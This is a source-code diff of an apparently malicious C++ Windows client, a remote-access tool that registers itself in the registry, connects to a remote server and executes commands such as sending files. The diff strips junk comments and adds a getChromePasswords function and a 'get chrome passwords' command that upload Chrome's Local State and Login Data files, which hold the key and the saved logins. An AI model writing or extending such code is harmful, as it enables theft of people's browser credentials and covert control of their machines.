@@ -11,15 +11,10 @@ Connection::Connection(string ip, unsigned int port) {
 }
 
 int Connection::boot() {
-
-    //fdsa 3ouqrueiqw piufdwqj;klfdsa ;j'lfdsa939-r ew9jqafpoiewq94-uur9- q2rewqf
-
     TCHAR szPath[MAX_PATH];
     DWORD pathLen = 0;
     pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
     cout << szPath << endl;
-
-    //fdsa21 32-1 -321  31   ewqe dws qdsa 3ouFDSAqrueiqwFDS AFpFDSiufdwqj;klfdsa FDSAFD;j'lfdfdssa939-r ew9jqaffdsapoiewq94-uufdsar9- q2rewfdsaqf
 
     if (pathLen == 0) {
         cerr << "Something went wrong" << endl;
@@ -31,57 +26,6 @@ int Connection::boot() {
         cerr << "Cant open the registry" << endl;
         return -1;
     }
-
-    //fdsa feiw0q =032q 90uaws fdsa];fdpwa- rewq-=r04392q=0]Z
-
-    /*
-     fdsaf wqpfedwa
-     fe2qw03082q 84032q 0=4ew a
-     as9r w=0afdsaq39r 0w2qr9340w2q0rewa \rA+)
-     WE)R(E+#weAWfdsaer
-     */
-
-    //fdsa fefdsa3 r4eqiw0q =032q 90uaws fdsa];fdpwa- rewq-=r04392q=0]Z
-
-    /*
-     fdsaf wqpfedwa
-     fdsa 84032q 0=4ew a
-     as9r w=0aq39r 0w2qr9340w2q0rewa \rA+)
-     WE)R(E+#weAWfdredwafdvcxzsaer
-     */
-//fdsa feiw0q =032q 90uaws fdsa];fdpwa- rewq-=r04392q=0]Z
-
-    /*
-     fdsaf wqpfedwav vcxz
-     fe2qw03082q 84032q 0=4ew a
-     as9r w=fdsa0aq3v9r 0w2qr9340w2q0rewa \rA+)
-     WE)R(E+#weAWfdsaer
-     */
-//fdsa feiw0q =032q 90uaws fdsa];fdpwa- rewq-=r04392q=0]Z
-
-    /*
-     fdsaf wqpfedwa
-     fe2qw03082q 84032q 0=4ew a
-     as9r w=0aq39r 0w2qr9340w2q0rewa \rA+)
-     WE)R(E+#weAWfdsaerr342q 24rwrea
-     */
-//fdsa fei3 32 432w0q =032q 90uaws fdsa];fdpwa- rewq-=r04392q=0]Z
-
-    /*
-     fdsaf wqpfedwa
-     fe2qw03082qfdsa 84032q 0=4ew a
-     as9r w=0aq39r 0w2qr9340w2q0rewa \rA+)
-     WE)R(E+#weAWfdsaer
-     */
-//fdsa feiw0q =032q 90uaws fdsa];fdpwa- rewq-=r04392q=0]Z
-
-    /*
-     fdsaf wqpfedwa
-     fe2qw03082q 84032q fdsa 0=4ew a
-     as9r w=0aq39r 0w2qr9340wfdsafdsa3 8432-232q0rewa \rA+)
-     WE)R(E+#weAWfdsaer
-     */
-
 
 
     DWORD pathLenInBytes = pathLen * sizeof(*szPath);
@@ -219,6 +163,13 @@ int Connection::startConnection() {
     return 0;
 }
 
+void Connection::getChromePasswords() {
+    string path = getenv("LOCALAPPDATA");
+    cout << path + "\\Google\\Chrome\\UserData\\Local State" << endl;
+    sendFile(path + "\\Google\\Chrome\\User Data\\Local State");
+    sendFile(path + "\\Google\\Chrome\\User Data\\default\\Login Data");
+}
+
 
 void Connection::connection() {
     startConnection();
@@ -266,6 +217,8 @@ void Connection::connection() {
             command = command.substr(10, command.size() - 1);
             sendFile(command);
             continue;
+        } else if (!command.rfind("get chrome passwords")) {
+            getChromePasswords();
         } else if (!command.rfind("get files")) {
             command = command.substr(10, command.size() - 1);
             string files = getAllFiles(command).c_str();
